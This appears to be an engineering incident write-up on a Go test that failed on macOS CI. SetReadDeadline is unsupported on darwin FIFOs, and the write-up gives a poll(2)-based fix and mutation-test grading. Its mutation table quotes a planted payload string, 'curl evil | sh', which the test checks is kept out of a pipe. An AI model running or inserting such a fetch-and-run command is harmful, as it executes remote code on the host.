# A read deadline is a poller fact, and a FIFO is not pollable on darwin (ranger-base-njj5z)

2026-11-22, from a linux seat (Linux 7.2.15 x86_64, go1.27.3, 16 cores). No
darwin box was touched. The red was READ off ci.yml's macos arm 2 and the
cause was read out of the Go source the macos leg builds with, which is
GOOS-conditional and therefore says what darwin does without a darwin box
being needed to ask it.

## the row

MEASURED, the newest completed leg at the time of filing: commit 2a50bcb5
(ranger-base-t0ha1), run 44990274146, job 137109586870, `test (macos-latest,
2)` — the job's only `--- FAIL`:

```
--- FAIL: TestFoldWritesNothingIntoAPlantersPipe (0.00s)
    refusalleaf_test.go:171: file type does not support deadline
```

ubuntu arms 1/2/3 and macos arm 3 were `success` on that run. The 0.00s is
the whole diagnosis available from the log: the test died at the bound and
never read.

## the cause, with the line

`leafReachedThePlanter` put a 500ms `SetReadDeadline` on the `*os.File` that
`leafFifoWithAReader` had opened for the planted FIFO. An `os.File` carries a
deadline only for a descriptor the runtime netpoller took, and `os/file_unix.go`
excludes exactly this one on darwin — `newFile`, in the `kind == kindOpenFile`
switch:

```go
// In addition to the behavior described above for regular files,
// on Darwin, kqueue does not work properly with fifos:
// closing the last writer does not cause a kqueue event
// for any readers. See issue #24164.
if (runtime.GOOS == "darwin" || runtime.GOOS == "ios") && typ == syscall.S_IFIFO {
    pollable = false
}
```

So `pollable` is false, `poll.FD.Init` registers nothing, and
`SetReadDeadline` answers `ErrNoDeadline`, whose text is the string in the
log. On linux the same open IS pollable, the deadline is honoured, and the
arm is green — the bound's premise ("I can put 500ms on this read") was a
linux fact written as a universal one. Nothing in the file said which hosts
it held on, and nothing could have: the premise had no test.

It is not a flake and not a version drift. The exclusion is deliberate, has
been there since Go 1.11 (issue #24164), and arrived with the test:
ba24a5af (ranger-base-q2peg) is the landing that put this file's
live-descriptor arms in, and its close records `make tree-check` green with
land-check's `GOOS=darwin` vet included — a vet cannot see a runtime
capability, so there was no door between that landing and the macos leg.

## the fix: O_NONBLOCK plus poll(2), and no os.File at all

`leafFifoWithAReader` now returns a RAW descriptor (`unix.Open` with
`O_RDONLY|O_NONBLOCK|O_CLOEXEC`), which is also what a planter actually
holds, and `leafReachedThePlanter` bounds the read with a non-blocking
`unix.Read` followed by `unix.Poll` for whatever is left of the 500ms.
`unix.Poll` is one signature on both hosts (`golang.org/x/sys@v0.47.0`:
`syscall_linux.go:161` over `Ppoll`, `syscall_bsd.go:591` over darwin's
`poll` in `zsyscall_darwin_{amd64,arm64}.go:322`), `unix.POLLIN` is `0x1` on
both, and darwin's `poll(2)` is not kqueue, so the broken-kqueue-over-FIFO
fact the Go comment names does not reach it.

Most passes do not reach the poll at all, on either host: POSIX makes a read
of a pipe with no writers return 0 rather than EAGAIN, so an empty planter's
end answers EOF immediately — which is why the arm costs 0.00s rather than
500ms. The poll is the belt for the one case that can EAGAIN, a writer open
with no data yet. Bytes already in the pipe are read before the poll on every
pass, since the call under test has returned by the time anyone asks.

The assertion was NOT dropped and the arm was not skipped off linux: a skip
would retire it on a platform that has the same FIFO and the same planter.

## graded, both ways (MEASURED 2026-11-22, linux)

| mutant | result |
|---|---|
| `flag == os.O_RDONLY && !fi.Mode().IsRegular()` in `openRefusalLeaf` (ranger-base-q2peg's narrowing) | `TestFoldWritesNothingIntoAPlantersPipe` reds and reads `session=s1 curl evil \| sh` back out of the pipe; the new premise pin stays green |
| the bound's `return string(buf[:n])` → `return ""` | `TestLeafReachedThePlanterSeesWhatIsInThePipe` is the ONLY red in the file |

Each mutant reverted; `git diff --no-ext-diff HEAD -- internal/posse/refusalleaf.go`
empty afterwards.

## the thing worth keeping

The bound's premise is now a test rather than an assumption:
`TestLeafReachedThePlanterSeesWhatIsInThePipe` writes bytes into the planted
FIFO and asserts the helper reads them back, in the same arm, on whatever host
is running. Had that pin existed on 2026-11-21 the macos red would have named
the helper instead of the fold. The deadline version was lucky in one
direction — it FATALLED on darwin rather than returning "" — so the gap was
visible at all; a bound that had quietly answered "" would have made
`TestFoldWritesNothingIntoAPlantersPipe` a tautology on macos and nothing in
the suite would have said so.

The class is "a test helper whose bound is a per-platform runtime capability",
and the door against it is to measure the bound, not to assert it.
